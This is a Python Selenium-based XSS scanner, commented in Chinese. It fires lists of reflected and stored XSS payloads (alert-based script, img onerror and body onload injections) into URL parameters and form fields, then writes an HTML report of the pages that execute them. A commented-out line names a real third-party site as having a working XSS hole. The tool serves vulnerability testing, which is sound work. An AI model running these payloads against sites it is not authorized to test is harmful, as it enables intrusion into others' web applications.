# coding: utf8
# -*- coding: utf-8 -*-
from selenium import webdriver
import global_list
from selenium.common.exceptions import NoSuchElementException
import unittest, time, re
import urllib2
import HTMLTestRunner
import time
import urlAudit
import sys

global GLOBAL_URL_DETECTED

''' 实现XSS的检测，并生成测试报告 '''

class XSS_detect(unittest.TestCase):

	def init(self):
		'''useless'''
		self.driver = webdriver.Firefox()
		self.username = 'admin'
		self.password = 'password'

	
	def setUp(self):
		self.driver = webdriver.Firefox()
		self.driver.implicitly_wait(20)

		self.baseUrl = GLOBAL_URL_DETECTED
		#print "XSS_detect-url",self.baseUrl
		self.verificationErrors = []
		self.accept_next_alert = True

		#html标签之间类型，若弹窗则未过滤<>;
		#输出在script中类型，若不弹窗则过滤了script或<>;
		#弹窗则未过滤不同大小写script的关键字；
		#均过滤了<>和script关键字
		#输出在标签中，可闭合前一个标签，执行脚本；
		#输出在被注释的js中，先换行再执行脚本
		self.refleced_payload = ["<img src=1 onerror=alert(1);>",\
						"><body onload=alert(1)>",\
						"</script><script>alert(1);</script>",\
						"<ScRiPt >alert(1);</ScRiPt>",\
						"eval(%26%23x27 alert(1)%26%23x27);void",\
						"/><script>alert(1);</script><!--",\
						"alert(1)"]
		self.stored_payload = ["<img src=1 onerror=alert(1);>",\
						"><body onload=alert(1)>",\
						"</script><script>alert(1);</script>",\
						"<ScRiPt >alert(1);</ScRiPt>",\
						"eval(%26%23x27 alert(1)%26%23x27);void",\
						"/><script>alert(1);</script><!--",\
						"alert(1)"]

	def load(self,url):
		'''加载url'''
		self.driver.get(url)

	
	def XSS_detected(self):
		u"""XSS测试用例"""
		if self.baseUrl != None:
			#print 'url:',self.baseUrl
			
			xssreflected = urlAudit.Reflected()
			#判断是否有带参数
			testurl=xssreflected.assign(self.baseUrl)
			#print "testurl=",testurl
			#带参数则分离提取url
			if testurl:
				arg = xssreflected.audit(self.baseUrl.rstrip('\n'))
				rooturl = arg[0]
				query = arg[1]
				query_len = arg[2]
				for i in range(query_len):
					#print 'i=',i
					#添加payload构造请求
					self.payload_request(rooturl,query,i)

				#分析页面的存储型XSS
				self.spider_stored(self.baseUrl)
			#否则分析页面
			else:

				self.spider_reflected(self.baseUrl)
				self.spider_stored(self.baseUrl)
			#输出最后结论
			self.output_report()
			
			
	def payload_request(self,rooturl,query,i):		
		'''添加payload构造请求 '''
		for xsscase in self.refleced_payload:
			query2=[]
			query2=query[:]
			query2[i]=query2[i]+xsscase
            #print 'quety2[%d]===' % (i,query2[i])
			querystr='&'.join(query2)
            #print "querystr====",querystr
			urlrequest = '%s?%s' % (rooturl,querystr)
			#print 'payloadUrl:',urlrequest
			self.load(urlrequest)
			res = self.reflected_catch_alert(query[i],xsscase)
			if res:
				break


	def spider_reflected(self,url):
		'''爬虫分析页面表单 反射型'''
		self.load(url)
		#print u"#分析反射型xss"		
		try:			
			form = self.driver.find_element_by_xpath("//form")
			inputs = form.find_elements_by_xpath("//input[@type='text']")
			inputs_len = len(inputs)
			#print "inputs_len:",inputs_len
			#分别测试input输入框
			for i in range(0,inputs_len):
				self.load(url)
				form = self.driver.find_element_by_xpath("//form")
				inputs = form.find_elements_by_xpath("//input[@type='text']")
				input_name = inputs[i].get_attribute('name')			
				injection_point = "//form//input[@name='"
				injection_point += input_name
				injection_point += "']"

				for xsscase in self.refleced_payload:
					self.load(url)
					form = self.driver.find_element_by_xpath("//form")
					inputs = form.find_elements_by_xpath("//input[@type='text']")
					inputs[i].clear()
					inputs[i].send_keys(xsscase)			
					form.find_element_by_xpath("//input[@type='submit']").click()
					res = self.reflected_catch_alert(injection_point,xsscase)
					if res:
						break
		except :
			#print "This page doesn't have a get type form"
			pass
			
		
	def spider_stored(self,url):
		'''爬虫分析页面表单  存储型'''
		#print u"#分析存储型xss"	
		try:
			for xsscase in self.stored_payload:
				self.load(url)
				form = self.driver.find_element_by_xpath("//form")
				textarea = form.find_element_by_xpath('//textarea')
				textarea.clear()
				textarea.send_keys(xsscase)
				injection_point = '//form/textarea/'
				form.find_element_by_xpath("//input[@type='submit']").click()
				res = self.stored_catch_alert(injection_point,xsscase)
				if res:
					break
		except:
			#print "This page doesn't have a Rich text label"
			pass

	
	def reflected_catch_alert(self,injection_point,xsscase):
		'''捕获alert弹框'''
		time.sleep(1)
		try:
			self.driver.switch_to_alert().accept()
			#print 'Reflected XSS vulnerability detected!'
			#print 'injection_point:',injection_point
			global_list.REFlECTED_XSS_INJECTION_dict[injection_point]=xsscase
			global_list.NUM_REFlECTED_XSS += 1
			return True
		except:
			#print "There isn't a Reflected XSS vulnerability!"
			#print 'injection_point:',injection_point
			return False

	def stored_catch_alert(self,injection_point,xsscase):
		'''捕获alert弹框'''
		time.sleep(1)
		try:
			self.driver.switch_to_alert().accept()
			#print 'Stored XSS vulnerability detected!'
			#print 'injection_point:',injection_point
			global_list.STROED_XSS_INJECTION_dict[injection_point]=xsscase
			global_list.NUM_STROED_XSS += 1
			return True
		except:
			#print "There isn't a Stored XSS vulnerability!"
			#print 'injection_point:',injection_point	
			return False

	def output_report(self):
		'''检测报告结论'''
		print u"\n\t\t\t\t检测结论："
		print "-----------------------------------------------------------------------------------"
		print u"  测试URL：\n",self.baseUrl
		print "-----------------------------------------------------------------------------------"
		if global_list.NUM_REFlECTED_XSS == 0:
			print u"  该网页没有检测到反射型xss漏洞。"
		else:
			print u"  该网页检测到反射型xss漏洞:"
			for k,v in global_list.REFlECTED_XSS_INJECTION_dict.items():
				print u"注入点：",k
				print u"payload用例：",v
		print "-----------------------------------------------------------------------------------"

		if global_list.NUM_STROED_XSS == 0:
			print u"  该网页没有检测到存储型xss漏洞。"
		else:
			print u"  该网页检测到存储型xss漏洞:"
			for k,v in global_list.STROED_XSS_INJECTION_dict.items():
				print u"注入点：",k
				print u"payload用例：",v

	


	def tearDown(self):
		'''关闭浏览器'''
		self.driver.quit()
		self.assertEqual([], self.verificationErrors)
		


if __name__=='__main__':
	#xss_detection_brower = Browser()
	#实际有洞网站测试
	#url = 'http://www.digitalchina.com.hk/c/about_mgt_details.php?id=12094()"%26%25<acx><ScRiPt >alert('XSS');</ScRiPt>'	
	#xss_detection_brower.load_url_get(url)
	print 'sys.argv[1]:',sys.argv[1]
	GLOBAL_URL_DETECTED = sys.argv[1]
	#定义一个单元测试容器
	testunit=unittest.TestSuite()
	#将测试用例加入到测试容器中
	testunit.addTest(XSS_detect("XSS_detected"))
	
	#定义个报告存放路径，支持相对路径
	now = time.strftime("%Y-%m-%M_%H-%M-%S",time.localtime(time.time()))
	filename = 'D:/PythonCode/XDT/report/'+now+'result.html'
	fp = file(filename, 'wb')
	#定义测试报告
	runner =HTMLTestRunner.HTMLTestRunner(
	stream=fp,
	title=u'XSS测试报告',
	description=u'用例执行情况：')
	#运行测试用例
	runner.run(testunit)

	'''
	driver = webdriver.Firefox()
	#driver.manage().window().maximise()
	#driver.implicitly_wait(30)
	#time.sleep(3)
	#driver.get('file:///D:/Python%20Code/selenium_test/test1.html')
	driver.get('file:///D:/Python%20Code/selenium_test/result.html')
	#driver.navigate().refresh()
	xss_detection_brower.close()
	# html = driver.find_element_by_tag_name('html')

    self.payload = "%22()%26%25<acx><ScRiPt%20>alert(1);</ScRiPt>"


	'''
